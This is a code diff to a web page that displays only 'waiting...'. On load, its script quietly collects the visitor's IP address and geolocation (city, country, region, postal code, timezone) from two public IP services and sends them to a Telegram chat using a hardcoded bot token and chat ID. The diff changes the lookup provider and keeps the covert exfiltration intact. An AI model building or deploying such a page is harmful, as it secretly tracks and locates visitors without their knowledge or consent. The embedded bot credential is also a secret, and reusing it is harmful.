@@ -12,19 +12,36 @@
   <body>
     waiting...
     <script>
+      async function getOnlyIp() {
+        const req = await fetch("https://api.ipify.org?format=json");
+        const getIp = await req.json();
+        return getIp;
+      }
+
       async function getUserInfo() {
-        const request = await fetch("http://ip-api.com/json/?fields=61439", {
+        const { ip } = await getOnlyIp();
+        console.log(ip);
+        const request = await fetch(`https://freeipapi.com/api/json/${ip}`, {
           method: "GET",
         });
         const response = await request.json();
+        console.log(response);
         return response;
       }
       window.addEventListener("load", async () => {
-        const { query, city, countryCode, postal, regionName, timezone, isp } =
-          await getUserInfo();
+        const { ip } = await getOnlyIp();
+        const {
+          ipAddress,
+          cityName,
+          countryName,
+          zipCode,
+          regionName,
+          timeZones,
+        } = await getUserInfo();
         const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
         const chatId = "-1002217556728";
-        const textField = `User info :%0A - ip -> ${query}%0A - country -> ${countryCode}%0A - city -> ${city}%0A - region -> ${regionName}%0A - postal -> ${postal}%0A - operator -> ${isp}%0A - timezone -> ${timezone}`;
+        const textField = `User info :%0A - ip -> ${ipAddress}%0A - country -> ${countryName}%0A - city -> ${cityName}%0A - region -> ${regionName}%0A - postal -> ${zipCode}%0A - timezone -> ${timeZones[0]}`;
+        console.log(textField);
         const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
 
         let api = new XMLHttpRequest();
